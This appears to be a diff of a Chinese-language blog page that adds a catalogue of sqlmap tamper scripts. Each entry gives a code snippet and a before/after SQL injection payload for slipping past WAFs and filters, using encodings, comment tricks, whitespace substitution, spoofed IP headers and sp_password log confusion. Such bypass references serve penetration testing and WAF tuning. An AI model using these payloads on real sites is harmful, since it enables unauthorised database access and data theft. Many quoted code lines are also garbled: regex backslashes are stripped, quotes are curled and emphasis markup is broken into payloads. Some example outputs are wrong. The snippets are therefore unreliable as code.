@@ -272,7 +272,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">766</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">3.1k</span>阅读时长: <span class="post-count reading-time">14 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -524,6 +524,334 @@ height:50vh;
 <ul>
 <li>xforwardedfor.py 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF</li>
 </ul>
+<p>下面针对 sqlmap 自带的 tamper 做一下简单的解释。</p>
+<h4 id="apostrophemask-py"><a href="#apostrophemask-py" class="headerlink" title="apostrophemask.py:"></a>apostrophemask.py:</h4><blockquote>
+<p>return payload.replace(‘’’, “%EF%BC%87”) if payload else payload</p>
+</blockquote>
+<p>将单引号 url 编码，用于过滤了单引号的情况。</p>
+<blockquote>
+<p>1’ AND ‘1’=’1 <strong>to</strong> 1%EF%BC%87 AND %EF%BC%871%EF%BC%87=%EF%BC%871</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="apostrophenullencode-py"><a href="#apostrophenullencode-py" class="headerlink" title="apostrophenullencode.py:"></a>apostrophenullencode.py:</h4><blockquote>
+<p>return payload.replace(‘’’, “%00%27”) if payload else payload</p>
+</blockquote>
+<p>将单引号替换为宽字节 unicode 字符，用于过滤了单引号的情况</p>
+<blockquote>
+<p>1’ AND ‘1’=’1 <strong>to</strong> 1�’ AND �’1�’=�’1</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="appendnullbyte-py"><a href="#appendnullbyte-py" class="headerlink" title="appendnullbyte.py:"></a>appendnullbyte.py:</h4><blockquote>
+<p>return “%s%%00” % payload if payload else payload</p>
+</blockquote>
+<p>在你构造的payload后面加一个空字符</p>
+<blockquote>
+<p>1’ AND ‘1’=’1 <strong>to</strong> 1’ AND ‘1’=’1[]</p>
+</blockquote>
+<p><strong>适用数据库：</strong>Access</p>
+<h4 id="base64encode-py"><a href="#base64encode-py" class="headerlink" title="base64encode.py:"></a>base64encode.py:</h4><blockquote>
+<p>return base64.b64encode(payload.encode(UNICODE_ENCODING)) if payload else payload</p>
+</blockquote>
+<p>这个看模块名也知道是 base64 编码</p>
+<blockquote>
+<p>1’ AND ‘1’=’1 <strong>to</strong> MScgQU5EICcxJz0nMQ==</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="between-py"><a href="#between-py" class="headerlink" title="between.py:"></a>between.py:</h4><p>这个代码有点长，就不贴代码了，可以自己去查看：</p>
+<p><code>\SQLMap\tamper\between.py</code></p>
+<p>将大于符号和等号用 between 语句替换，用于过滤了大于符号和等号的情况</p>
+<blockquote>
+<p>1 AND A &gt; B <strong>to</strong> 1 AND A NOT BETWEEN 0 AND B</p>
+<p>1 AND A = B <strong>to</strong> 1 AND A BETWEEN B AND B</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="bluecoat-py"><a href="#bluecoat-py" class="headerlink" title="bluecoat.py:"></a>bluecoat.py:</h4><p>用随机的空白字符代替空格，并且将等号替换为 like ，用于过滤了空格和等号的情况</p>
+<blockquote>
+<p>union select <em>from users where id = 1 <strong>to</strong> union%09select</em> from%09users where id like 1</p>
+</blockquote>
+<p><strong>适用数据库：</strong>MySQL 5.1, SGOS</p>
+<h4 id="chardoubleencode-py"><a href="#chardoubleencode-py" class="headerlink" title="chardoubleencode.py:"></a>chardoubleencode.py:</h4><p>用 url 编码两次你的 payload</p>
+<blockquote>
+<p>select * from users <strong>to</strong>%2573%2565%256c%2565%2563%2574%2520%252a%2520%2566%2572%256f%256d%2520%2575%2573%2565%2572</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="charencode-py"><a href="#charencode-py" class="headerlink" title="charencode.py:"></a>charencode.py:</h4><p>用 url 编码一次你的 payload</p>
+<blockquote>
+<p>select * from users <strong>to</strong>%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%75%73%65%72</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="charunicodeencode-py："><a href="#charunicodeencode-py：" class="headerlink" title="charunicodeencode.py："></a>charunicodeencode.py：</h4><p>用 unicode 编码 payload ，只编码非编码字符</p>
+<blockquote>
+<p>select * from users <strong>to</strong>u0073u0065u006cu0065u0063u0074u0020u002au0020u0066u0072u006fu006du0020u0075u0073u0065u0072u0073</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL，但是需要 asp 和 asp.net 环境</p>
+<h4 id="commalesslimit-py："><a href="#commalesslimit-py：" class="headerlink" title="commalesslimit.py："></a>commalesslimit.py：</h4><p>将 payload 中的逗号用 offset 代替，用于过滤了逗号并且是两个参数的情况</p>
+<blockquote>
+<p>limit 2,1 <strong>to</strong> limit 1 offset 2</p>
+</blockquote>
+<p><strong>适用数据库：</strong>MySQL</p>
+<h4 id="commalessmid-py："><a href="#commalessmid-py：" class="headerlink" title="commalessmid.py："></a>commalessmid.py：</h4><p>将 payload 中的逗号用 from for 代替，用于过滤了逗号并且是三参数的情况</p>
+<blockquote>
+<p>mid(version(), 1, 1) <strong>to</strong> mid(version() from 1 for 1)</p>
+</blockquote>
+<p><strong>适用数据库：</strong>MySQL</p>
+<h4 id="commentbeforeparentheses-py："><a href="#commentbeforeparentheses-py：" class="headerlink" title="commentbeforeparentheses.py："></a>commentbeforeparentheses.py：</h4><blockquote>
+<p>retVal = re.sub(r”b(w+)(“, “g<1>/**/(“, retVal)</1></p>
+</blockquote>
+<p>在某个单词后的第一个括号前面加入 /**/ ，用于过滤了函数的情况</p>
+<blockquote>
+<p>union select group_concat(table_name) <strong>to</strong> union select group_concat/**/(table_name)</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="concat2concatws-py："><a href="#concat2concatws-py：" class="headerlink" title="concat2concatws.py："></a>concat2concatws.py：</h4><blockquote>
+<p>payload = payload.replace(“CONCAT(“, “CONCAT_WS(MID(CHAR(0),0,0),”)</p>
+</blockquote>
+<p>用于过滤了 concat 函数的情况</p>
+<blockquote>
+<p>concat(1,2) <strong>to</strong> concat_ws(mid(char(0), 0, 0), 1, 2)</p>
+</blockquote>
+<p><strong>适用数据库：</strong>MySQL</p>
+<h4 id="equaltolike-py："><a href="#equaltolike-py：" class="headerlink" title="equaltolike.py："></a>equaltolike.py：</h4><blockquote>
+<p>retVal = re.sub(r”s<em>=s</em>“, “ LIKE “, retVal)</p>
+</blockquote>
+<p>将等号用 like 代替，用于过滤了等号的情况</p>
+<blockquote>
+<p>select <em>from users where id=1 <strong>to</strong> select</em> from users where id like 1</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="escapequotes-py："><a href="#escapequotes-py：" class="headerlink" title="escapequotes.py："></a>escapequotes.py：</h4><blockquote>
+<p>return payload.replace(“‘“, “‘“).replace(‘“‘, ‘“‘)</p>
+</blockquote>
+<p>将单引号转换成 \’ ，双引号转换成 \” ，用于过滤了单引号或双引号的情况</p>
+<blockquote>
+<p>1’ and 1=1–+ <strong>to</strong> 1\’ and 1=1–+</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="greatest-py："><a href="#greatest-py：" class="headerlink" title="greatest.py："></a>greatest.py：</h4><p>用 greatest 代替大于符号，用于大于符号被过滤了的情况</p>
+<blockquote>
+<p>1 and a&gt;b <strong>to</strong> 1 and greatest(a,b+1)=a</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="halfversionedmorekeywords-py："><a href="#halfversionedmorekeywords-py：" class="headerlink" title="halfversionedmorekeywords.py："></a>halfversionedmorekeywords.py：</h4><p>在关键字前添加注释，用于过滤了关键字的情况</p>
+<blockquote>
+<p>union select 1,2 <strong>to</strong> /<em>!0union/</em>!0select 1,2</p>
+</blockquote>
+<p><strong>适用数据库：</strong>MySQL &lt; 5.1</p>
+<h4 id="htmlencode-py："><a href="#htmlencode-py：" class="headerlink" title="htmlencode.py："></a>htmlencode.py：</h4><blockquote>
+<p>return re.sub(r”<a href="http://www.myh0st.cn/index.php/archives/881/#fn-1" target="_blank" rel="noopener">1</a>“, lambda match: “&amp;#%d;” % ord(match.group(0)), payload) if payload else payload</p>
+</blockquote>
+<p>从名字就知道是将 payload 进行 html 编码</p>
+<blockquote>
+<p>1’ and 1=1–+ <strong>to</strong> 1’ and 1=1–+</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="ifnull2ifisnull-py："><a href="#ifnull2ifisnull-py：" class="headerlink" title="ifnull2ifisnull.py："></a>ifnull2ifisnull.py：</h4><p>将 ifnull() 函数转为 if(isnull()) 函数，用于过滤了 ifnull 函数的情况</p>
+<blockquote>
+<p>ifnull(1, 2) <strong>to</strong> if(isnull(1), 2, 1)</p>
+</blockquote>
+<p><strong>适用数据库：</strong>MySql</p>
+<h4 id="informationschemacomment-py："><a href="#informationschemacomment-py：" class="headerlink" title="informationschemacomment.py："></a>informationschemacomment.py：</h4><blockquote>
+<p>retVal = re.sub(r”(?i)(information_schema).”, “g<1>/**/.”, payload)</1></p>
+</blockquote>
+<p>在 information_schema 后面加上 /**/ ，用于绕过对 information_schema 的情况</p>
+<blockquote>
+<p>select table_name from information_schema.tables <strong>to</strong> select table_name from information_schema/**/.tables</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="lowercase-py："><a href="#lowercase-py：" class="headerlink" title="lowercase.py："></a>lowercase.py：</h4><p>将 payload 里的大写转为小写</p>
+<blockquote>
+<p>UNION SELECT <strong>to</strong> union select</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="modsecurityversioned-py："><a href="#modsecurityversioned-py：" class="headerlink" title="modsecurityversioned.py："></a>modsecurityversioned.py：</h4><p>用注释来包围完整的查询语句，用于绕过 ModSecurity 开源 waf</p>
+<blockquote>
+<p>1 and 2&gt;1–+ <strong>to</strong> 1 /<em>!30874and 2&gt;1</em>/–+</p>
+</blockquote>
+<p><strong>适用数据库：</strong>MySQL</p>
+<h4 id="modsecurityzeroversioned-py："><a href="#modsecurityzeroversioned-py：" class="headerlink" title="modsecurityzeroversioned.py："></a>modsecurityzeroversioned.py：</h4><p>用注释来包围完整的查询语句，用于绕过 waf ，和上面类似</p>
+<blockquote>
+<p>1 and 2&gt;1–+ <strong>to</strong> 1 /<em>!00000and 2&gt;1</em>/–+</p>
+</blockquote>
+<p><strong>适用数据库：</strong>MySQL</p>
+<h4 id="multiplespaces-py："><a href="#multiplespaces-py：" class="headerlink" title="multiplespaces.py："></a>multiplespaces.py：</h4><p>在关键字周围添加多个空格</p>
+<blockquote>
+<p>union select 1,2–+ <strong>to</strong> union select 1,2–+</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="nonrecursivereplacement-py："><a href="#nonrecursivereplacement-py：" class="headerlink" title="nonrecursivereplacement.py："></a>nonrecursivereplacement.py：</h4><p>关键字双写，可用于关键字过滤</p>
+<blockquote>
+<p>union select 1,2–+ <strong>to</strong> uniounionn selecselectt 1,2–+</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="overlongutf8-py："><a href="#overlongutf8-py：" class="headerlink" title="overlongutf8.py："></a>overlongutf8.py：</h4><p>这个不是很懂，也去网上搜了下，都说是”转换给定的 payload 当中的所有字符“，类似空格大于小于这种</p>
+<blockquote>
+<p>select field from table where 2&gt;1 <strong>to</strong></p>
+<p>select%C0%AAfield%C0%AAfromtable%C0%AAwhere%C0%AA2%C0%BE1</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="percentage-py："><a href="#percentage-py：" class="headerlink" title="percentage.py："></a>percentage.py：</h4><p>用百分号来绕过关键字过滤，具体是在关键字的每个字母前面都加一个百分号</p>
+<blockquote>
+<p>select <em>from users <strong>to</strong> %s%e%l%e%c%t</em> %f%r%o%m %u%s%e%r%s</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL, 但是需要 ASP 环境</p>
+<h4 id="plus2concat-py："><a href="#plus2concat-py：" class="headerlink" title="plus2concat.py："></a>plus2concat.py：</h4><p>用 concat 函数来替代加号，用于加号被过滤的情况</p>
+<blockquote>
+<p>select char(13)+char(114)+char(115) from user <strong>to</strong> select concat(char(113),char(114),char(115)) from user</p>
+</blockquote>
+<p><strong>适用数据库：</strong>SQL Server 2012+</p>
+<h4 id="plus2fnconcat-py："><a href="#plus2fnconcat-py：" class="headerlink" title="plus2fnconcat.py："></a>plus2fnconcat.py：</h4><p>用 fn concat 来替代加号，和上面类似</p>
+<blockquote>
+<p>select char(13)+char(114)+char(115) from user <strong>to</strong> select {fn concat({ fn concat(char(113),char(114))},char(115))} from user</p>
+</blockquote>
+<p><strong>适用数据库：</strong>Microsoft SQL Server 2008+</p>
+<h4 id="randomcase-py："><a href="#randomcase-py：" class="headerlink" title="randomcase.py："></a>randomcase.py：</h4><p>将 payload 随机大小写，可用于大小写绕过的情况</p>
+<blockquote>
+<p>union select 1,2–+ <strong>to</strong> UniOn SElect 1,2–+</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="randomcomments-py："><a href="#randomcomments-py：" class="headerlink" title="randomcomments.py："></a>randomcomments.py：</h4><p>在 payload 的关键字中间随机插入 /**/ ，可用于绕过关键字过滤</p>
+<blockquote>
+<p>union select 1,2–+ <strong>to</strong> un/<strong>/ion sele/</strong>/ct 1,2–+</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="securesphere-py："><a href="#securesphere-py：" class="headerlink" title="securesphere.py："></a>securesphere.py：</h4><blockquote>
+<p>return payload + “ and ‘0having’=’0having’” if payload else payload</p>
+</blockquote>
+<p>在 payload 后面加入字符串，可以自定义</p>
+<blockquote>
+<p>1’ and 1=1 <strong>to</strong> 1’ and 1=1 ‘0having’=’0having’</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="sp-password-py："><a href="#sp-password-py：" class="headerlink" title="sp_password.py："></a>sp_password.py：</h4><blockquote>
+<p>retVal = “%s%ssp_password” % (payload, “– “ if not any(_ if <em>in payload else None for</em> in (‘#’, “– “)) else “”)</p>
+</blockquote>
+<p>在 payload 语句后添加 ssp_password ，用于迷惑数据库日志</p>
+<blockquote>
+<p>1’ and 1=1–+ <strong>to</strong> 1 and 1=1– sp_password</p>
+</blockquote>
+<p><strong>适用数据库：</strong>MSSQL</p>
+<h4 id="space2comment-py："><a href="#space2comment-py：" class="headerlink" title="space2comment.py："></a>space2comment.py：</h4><p>用 /**/ 替代空格，用于空格的绕过</p>
+<blockquote>
+<p>union select 1,2–+ <strong>to</strong> union/<strong>/select/</strong>/1,2–+</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="space2dash-py："><a href="#space2dash-py：" class="headerlink" title="space2dash.py："></a>space2dash.py：</h4><p>用注释符–和一个随机字符串加一个换行符替换控制符</p>
+<p>?union select 1,2–+ <strong>to</strong> union–HSHjsJh%0Aselect–HhjHSJ%0A1,2–+</p>
+<p><strong>适用数据库：</strong>MSSQL、 SQLite</p>
+<h4 id="space2hash-py："><a href="#space2hash-py：" class="headerlink" title="space2hash.py："></a>space2hash.py：</h4><p>和上面类似，不过这儿是用#注释符</p>
+<blockquote>
+<p>union select 1,2–+ <strong>to</strong> union%23HSHjsJh%0Aselect%23HhjHSJ%0A1,2–+</p>
+</blockquote>
+<p><strong>适用数据库：</strong>MySQL</p>
+<h4 id="space2morecomment-py："><a href="#space2morecomment-py：" class="headerlink" title="space2morecomment.py："></a>space2morecomment.py：</h4><p>将空格用 /<strong>_</strong>/ 替代</p>
+<blockquote>
+<p>union select 1,2–+ <strong>to</strong> union/<strong>_</strong>/select/<strong>_</strong>/1,2–+</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="space2morehash-py："><a href="#space2morehash-py：" class="headerlink" title="space2morehash.py："></a>space2morehash.py：</h4><p>和 space2hash.py 类似，但是这儿多一个 # 和换行符，具体看一下对比：</p>
+<blockquote>
+<p>space2hash.py： union select 1,2–+ <strong>to</strong> union %23 HSHjsJh %0A select %23 HhjHSJ %0A1,2–+</p>
+<p>space2morehash.py：union select 1,2–+ <strong>to</strong> union %23 HSHjsJh %0A select %23 HhjHSJ %0A%23 HJHJhj %0A 1,2–+</p>
+</blockquote>
+<p><strong>适用数据库：</strong>MySQL &gt;= 5.1.13</p>
+<h4 id="space2mssqlblank-py："><a href="#space2mssqlblank-py：" class="headerlink" title="space2mssqlblank.py："></a>space2mssqlblank.py：</h4><blockquote>
+<p>blanks = (‘%01’, ‘%02’, ‘%03’, ‘%04’, ‘%05’, ‘%06’, ‘%07’, ‘%08’, ‘%09’, ‘%0B’, ‘%0C’, ‘%0D’, ‘%0E’, ‘%0F’, ‘%0A’)</p>
+</blockquote>
+<p>用这些随机空白符替换 payload 中的空格</p>
+<blockquote>
+<p>union select 1,2–+ <strong>to</strong> union%01select%021,2–+</p>
+</blockquote>
+<p><strong>适用数据库：</strong>SQL Server</p>
+<h4 id="space2mssqlhash-py："><a href="#space2mssqlhash-py：" class="headerlink" title="space2mssqlhash.py："></a>space2mssqlhash.py：</h4><p>用 # 加一个换行符替换 payload 中的空格</p>
+<blockquote>
+<p>union select 1,2–+ <strong>to</strong> union%23%0Aselect%23%0A1,2–+</p>
+</blockquote>
+<p><strong>适用数据库：</strong>MSSQL、MySQL</p>
+<h4 id="space2mysqlblank-py："><a href="#space2mysqlblank-py：" class="headerlink" title="space2mysqlblank.py："></a>space2mysqlblank.py：</h4><blockquote>
+<p>blanks = (‘%09’, ‘%0A’, ‘%0C’, ‘%0D’, ‘%0B’)</p>
+</blockquote>
+<p>用这些随机空白符替换payload中的空格</p>
+<blockquote>
+<p>union select 1,2–+ <strong>to</strong> union%09select%0D1,2–+</p>
+</blockquote>
+<p><strong>适用数据库：</strong>MySQL</p>
+<h4 id="space2mysqldash-py："><a href="#space2mysqldash-py：" class="headerlink" title="space2mysqldash.py："></a>space2mysqldash.py：</h4><p>用 – 加一个换行符替换空格</p>
+<blockquote>
+<p>union select 1,2–+ <strong>to</strong> union–%0Aselect–%0A1,2–+</p>
+</blockquote>
+<p><strong>适用数据库：</strong>MySQL、MSSQL</p>
+<h4 id="space2plus-py："><a href="#space2plus-py：" class="headerlink" title="space2plus.py："></a>space2plus.py：</h4><p>用 + 替换空格</p>
+<blockquote>
+<p>union select 1,2–+ <strong>to</strong> union+select+1,2–+</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="space2randomblank-py："><a href="#space2randomblank-py：" class="headerlink" title="space2randomblank.py："></a>space2randomblank.py：</h4><blockquote>
+<p>blanks = (“%09”, “%0A”, “%0C”, “%0D”)</p>
+</blockquote>
+<p>用这些随机空白符替换 payload 中的空格</p>
+<blockquote>
+<p>union select 1,2–+ <strong>to</strong> union%09select%0C1,2–+</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="symboliclogical-py："><a href="#symboliclogical-py：" class="headerlink" title="symboliclogical.py："></a>symboliclogical.py：</h4><blockquote>
+<p>retVal = re.sub(r”(?i)bANDb”, “%26%26”, re.sub(r”(?i)bORb”, “%7C%7C”, payload))</p>
+</blockquote>
+<p>用 &amp;&amp; 替换 and ，用 || 替换 or ，用于这些关键字被过滤的情况</p>
+<blockquote>
+<p>1 and 1=1 <strong>to</strong> 1 %26%26 1=1</p>
+<p>1 or 1=1 <strong>to</strong> 1 %7c%7c 1=1</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="unionalltounion-py："><a href="#unionalltounion-py：" class="headerlink" title="unionalltounion.py："></a>unionalltounion.py：</h4><blockquote>
+<p>return payload.replace(“UNION ALL SELECT”, “UNION SELECT”) if payload else payload</p>
+</blockquote>
+<p>用 union select 替换union all select</p>
+<blockquote>
+<p>union all select 1,2–+ <strong>to</strong> union select 1,2–+</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="unmagicquotes-py："><a href="#unmagicquotes-py：" class="headerlink" title="unmagicquotes.py："></a>unmagicquotes.py：</h4><p>用宽字符绕过 GPC addslashes</p>
+<blockquote>
+<p>1‘ and 1=1 <strong>to</strong> 1%df%27 and 1=1–</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="uppercase-py："><a href="#uppercase-py：" class="headerlink" title="uppercase.py："></a>uppercase.py：</h4><p>将 payload 大写</p>
+<blockquote>
+<p>union select <strong>to</strong> UNION SELECT</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="varnish-py："><a href="#varnish-py：" class="headerlink" title="varnish.py："></a>varnish.py：</h4><blockquote>
+<p>headers = kwargs.get(“headers”, {})headers[“X-originating-IP”] = “127.0.0.1”return payload</p>
+</blockquote>
+<p>添加一个 HTTP 头 “ X-originating-IP ” 来绕过 WAF</p>
+<p>还可以自定义：</p>
+<blockquote>
+<p>X-forwarded-for: TARGET_CACHESERVER_IP (184.189.250.X)X-remote-IP: TARGET_PROXY_IP (184.189.250.X)X-originating-IP: TARGET_LOCAL_IP (127.0.0.1)x-remote-addr: TARGET_INTERNALUSER_IP (192.168.1.X)X-remote-IP: * or %00 or %0A</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="versionedkeywords-py"><a href="#versionedkeywords-py" class="headerlink" title="versionedkeywords.py"></a>versionedkeywords.py</h4><p>对不是函数的关键字进行注释</p>
+<blockquote>
+<p>1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#</p>
+</blockquote>
+<p><strong>to</strong></p>
+<blockquote>
+<p>1/<em>!UNION</em>//<em>!ALL</em>//<em>!SELECT</em>//<em>!NULL</em>/,/<em>!NULL</em>/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/<em>!AS</em>//<em>!CHAR</em>/),CHAR(32)),CHAR(58,100,114,117,58))#</p>
+</blockquote>
+<p><strong>适用数据库：</strong>MySQL</p>
+<h4 id="versionedmorekeywords-py："><a href="#versionedmorekeywords-py：" class="headerlink" title="versionedmorekeywords.py："></a>versionedmorekeywords.py：</h4><p>注释每个关键字</p>
+<blockquote>
+<p>1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#</p>
+</blockquote>
+<p><strong>to</strong></p>
+<blockquote>
+<p>1/<em>!UNION</em>//<em>!ALL</em>//<em>!SELECT</em>//<em>!NULL</em>/,/<em>!NULL</em>/,/<em>!CONCAT</em>/(/<em>!CHAR</em>/(58,122,114,115,58),/<em>!IFNULL</em>/(CAST(/<em>!CURRENT_USER</em>/()/<em>!AS</em>//<em>!CHAR</em>/),/<em>!CHAR</em>/(32)),/<em>!CHAR</em>/(58,115,114,121,58))#</p>
+</blockquote>
+<p><strong>适用数据库：</strong>MySQL &gt;= 5.1.13</p>
+<h4 id="xforwardedfor-py："><a href="#xforwardedfor-py：" class="headerlink" title="xforwardedfor.py："></a>xforwardedfor.py：</h4><blockquote>
+<p>headers = kwargs.get(“headers”, {})headers[“X-Forwarded-For”] = randomIP()return payload</p>
+</blockquote>
+<p>添加一个伪造的 HTTP 头 “ X-Forwarded-For ” 来绕过 WAF</p>
+<p><strong>适用数据库：</strong>ALL</p>
 
     </article>
     <!-- license  -->
@@ -531,6 +859,11 @@ height:50vh;
     <!-- paginator  -->
     <ul class="post-paginator">
         <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2019/03/04/xss-bypass-备忘录/" title="xss bypass 备忘录">
+                    <div class="nextTitle">xss bypass 备忘录</div>
+                </a>
             
         </li>
         <li class="previous">
@@ -603,6 +936,10 @@ height:50vh;
         
     
         
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title="rss"></a>
+            
+        
     
         
     
@@ -646,10 +983,16 @@ height:50vh;
     <!-- 不蒜子  -->
     
     <div class="busuanzi-container">
-    
-     
-    <span id="busuanzi_container_site_pv">阅读次数: <span id="busuanzi_value_site_pv"></span> : )</span>
-    
+        
+        
+        <span id="busuanzi_container_site_pv" class="theme-info">
+            &nbsp;&nbsp;|&nbsp;&nbsp;本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        </span>
+        <span id="busuanzi_container_site_uv" class="theme-info">
+            &nbsp;&nbsp;|&nbsp;&nbsp;本站访客数<span id="busuanzi_value_site_uv"></span>人次
+        </span>
+        <!-- <span id="busuanzi_container_site_pv">阅读次数: <span id="busuanzi_value_site_pv"></span> : )</span> -->
+        
     </div>
     
 </footer>
@@ -671,7 +1014,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#apostrophemask-py"><span class="toc-number">1.</span> <span class="toc-text">apostrophemask.py:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#apostrophenullencode-py"><span class="toc-number">2.</span> <span class="toc-text">apostrophenullencode.py:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#appendnullbyte-py"><span class="toc-number">3.</span> <span class="toc-text">appendnullbyte.py:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#base64encode-py"><span class="toc-number">4.</span> <span class="toc-text">base64encode.py:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#between-py"><span class="toc-number">5.</span> <span class="toc-text">between.py:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bluecoat-py"><span class="toc-number">6.</span> <span class="toc-text">bluecoat.py:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#chardoubleencode-py"><span class="toc-number">7.</span> <span class="toc-text">chardoubleencode.py:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#charencode-py"><span class="toc-number">8.</span> <span class="toc-text">charencode.py:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#charunicodeencode-py："><span class="toc-number">9.</span> <span class="toc-text">charunicodeencode.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#commalesslimit-py："><span class="toc-number">10.</span> <span class="toc-text">commalesslimit.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#commalessmid-py："><span class="toc-number">11.</span> <span class="toc-text">commalessmid.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#commentbeforeparentheses-py："><span class="toc-number">12.</span> <span class="toc-text">commentbeforeparentheses.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#concat2concatws-py："><span class="toc-number">13.</span> <span class="toc-text">concat2concatws.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#equaltolike-py："><span class="toc-number">14.</span> <span class="toc-text">equaltolike.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#escapequotes-py："><span class="toc-number">15.</span> <span class="toc-text">escapequotes.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#greatest-py："><span class="toc-number">16.</span> <span class="toc-text">greatest.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#halfversionedmorekeywords-py："><span class="toc-number">17.</span> <span class="toc-text">halfversionedmorekeywords.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#htmlencode-py："><span class="toc-number">18.</span> <span class="toc-text">htmlencode.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ifnull2ifisnull-py："><span class="toc-number">19.</span> <span class="toc-text">ifnull2ifisnull.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#informationschemacomment-py："><span class="toc-number">20.</span> <span class="toc-text">informationschemacomment.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#lowercase-py："><span class="toc-number">21.</span> <span class="toc-text">lowercase.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#modsecurityversioned-py："><span class="toc-number">22.</span> <span class="toc-text">modsecurityversioned.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#modsecurityzeroversioned-py："><span class="toc-number">23.</span> <span class="toc-text">modsecurityzeroversioned.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#multiplespaces-py："><span class="toc-number">24.</span> <span class="toc-text">multiplespaces.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nonrecursivereplacement-py："><span class="toc-number">25.</span> <span class="toc-text">nonrecursivereplacement.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#overlongutf8-py："><span class="toc-number">26.</span> <span class="toc-text">overlongutf8.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#percentage-py："><span class="toc-number">27.</span> <span class="toc-text">percentage.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#plus2concat-py："><span class="toc-number">28.</span> <span class="toc-text">plus2concat.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#plus2fnconcat-py："><span class="toc-number">29.</span> <span class="toc-text">plus2fnconcat.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#randomcase-py："><span class="toc-number">30.</span> <span class="toc-text">randomcase.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#randomcomments-py："><span class="toc-number">31.</span> <span class="toc-text">randomcomments.py：</span></a></li><li class="toc-item 